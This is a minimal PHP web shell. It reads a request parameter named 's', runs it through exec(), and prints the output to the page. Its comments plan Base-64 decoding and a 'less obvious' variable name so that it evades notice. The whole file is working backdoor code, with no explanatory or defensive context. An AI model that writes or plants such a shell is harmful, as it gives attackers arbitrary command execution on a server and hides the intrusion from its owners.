<?php
/* Super basic PHP command shell.
       TODO
       - Base-64 decoding
       - Change the "shell" variable to... something else... less obvious
*/
     $cmd = $_REQUEST["s"];
     exec($cmd, $out);
     foreach ($out as $line){
          echo "$line <br>";
     }
?>
